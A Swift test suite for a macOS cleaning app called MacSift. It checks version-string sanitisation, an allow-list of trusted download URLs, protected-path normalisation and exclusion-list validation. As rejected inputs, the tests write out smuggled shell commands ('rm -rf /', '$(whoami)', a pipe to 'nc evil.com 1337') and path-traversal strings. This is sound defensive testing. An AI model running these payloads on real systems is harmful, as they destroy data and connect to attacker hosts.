import Testing
import Foundation
@testable import MacSift

// MARK: - Version string sanitization

@Suite("Security · version string sanitization")
struct VersionSanitizationTests {
    @Test func plainSemverIsAccepted() {
        #expect(UpdateChecker.isSafeVersionString("0.2.6"))
        #expect(UpdateChecker.isSafeVersionString("1.0.0"))
        #expect(UpdateChecker.isSafeVersionString("10.20.30"))
    }

    @Test func preReleaseSuffixesAreAccepted() {
        #expect(UpdateChecker.isSafeVersionString("1.0.0-rc.1"))
        #expect(UpdateChecker.isSafeVersionString("0.0.0-dev"))
        #expect(UpdateChecker.isSafeVersionString("2.1.0_beta"))
    }

    @Test func emptyStringIsRejected() {
        #expect(!UpdateChecker.isSafeVersionString(""))
    }

    @Test func pathTraversalIsRejected() {
        #expect(!UpdateChecker.isSafeVersionString("../../etc/passwd"))
        #expect(!UpdateChecker.isSafeVersionString("..\\..\\Windows"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6/../evil"))
    }

    @Test func shellMetacharactersAreRejected() {
        #expect(!UpdateChecker.isSafeVersionString("0.2.6; rm -rf /"))
        #expect(!UpdateChecker.isSafeVersionString("$(whoami)"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6 && touch /tmp/pwned"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6`id`"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6|nc evil.com 1337"))
    }

    @Test func whitespaceAndControlCharsAreRejected() {
        #expect(!UpdateChecker.isSafeVersionString("0.2.6 "))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6\n"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6\t"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6\0"))
    }

    @Test func overlyLongStringIsRejected() {
        let long = String(repeating: "a", count: 33)
        #expect(!UpdateChecker.isSafeVersionString(long))
    }
}

// MARK: - Download URL allow-list

@Suite("Security · download URL allow-list")
struct DownloadURLAllowListTests {
    @Test func githubComIsTrusted() {
        let url = URL(string: "https://github.com/Lcharvol/MacSift/releases/download/v0.3.0/MacSift.zip")!
        #expect(UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func githubReleaseCDNIsTrusted() {
        let url = URL(string: "https://objects.githubusercontent.com/github-production-release-asset/...")!
        #expect(UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func httpIsRejected() {
        let url = URL(string: "http://github.com/Lcharvol/MacSift/releases/download/v0.3.0/MacSift.zip")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func fileSchemeIsRejected() {
        let url = URL(string: "file:///etc/passwd")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func arbitraryHostIsRejected() {
        let url = URL(string: "https://malicious.example/MacSift.zip")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func similarLookingHostIsRejected() {
        // `github.com.malicious.example` — technically a valid host that
        // COULD fool a naive hasSuffix check. Confirm we require exact
        // equality or `.githubusercontent.com` suffix.
        let url = URL(string: "https://github.com.malicious.example/MacSift.zip")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }
}

// MARK: - CleaningEngine never-delete normalization

@Suite("Security · CleaningEngine path normalization")
struct CleaningEnginePathNormalizationTests {
    private func attemptDelete(_ path: String) async -> (deleted: Int, failed: Int) {
        let file = ScannedFile(
            url: URL(filePath: path),
            size: 0,
            category: .cache,
            description: "",
            modificationDate: .now,
            isDirectory: false
        )
        let engine = CleaningEngine()
        let report = await engine.clean(files: [file], dryRun: false)
        return (report.deletedCount, report.failedFiles.count)
    }

    @Test func cannotBypassProtectionWithDoubleSlash() async {
        let result = await attemptDelete("//System//Library//evil")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func cannotBypassProtectionWithDotDot() async {
        let result = await attemptDelete("/System/Library/../Library/evil")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func cannotBypassProtectionWithSingleDotSegment() async {
        let result = await attemptDelete("/System/./Library/evil")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func usrBinIsBlocked() async {
        let result = await attemptDelete("/usr/bin/file")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func volumeSpotlightFolderIsBlocked() async {
        let result = await attemptDelete("/Volumes/T7/.Spotlight-V100/Store-V2/some.db")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }
}

// MARK: - ExclusionManager load validation

@MainActor
@Suite("Security · ExclusionManager input validation", .serialized)
struct ExclusionManagerSecurityTests {
    private func makeSuite() -> String { "test.sec.\(UUID().uuidString)" }

    @Test func rejectsEmptyStrings() {
        let suite = makeSuite()
        UserDefaults(suiteName: suite)!.set(["", "/tmp/legit"], forKey: "excludedPaths")
        let mgr = ExclusionManager(userDefaultsSuiteName: suite)
        #expect(mgr.excludedPaths.count == 1)
        #expect(mgr.excludedPaths.first?.path(percentEncoded: false) == "/tmp/legit")
    }

    @Test func rejectsNonAbsolutePaths() {
        let suite = makeSuite()
        UserDefaults(suiteName: suite)!.set(["relative/path", "/tmp/legit"], forKey: "excludedPaths")
        let mgr = ExclusionManager(userDefaultsSuiteName: suite)
        #expect(mgr.excludedPaths.count == 1)
    }

    @Test func rejectsPathTraversal() {
        let suite = makeSuite()
        UserDefaults(suiteName: suite)!.set(["/Users/../etc/passwd", "/tmp/legit"], forKey: "excludedPaths")
        let mgr = ExclusionManager(userDefaultsSuiteName: suite)
        #expect(mgr.excludedPaths.count == 1)
        #expect(mgr.excludedPaths.first?.path(percentEncoded: false) == "/tmp/legit")
    }
}
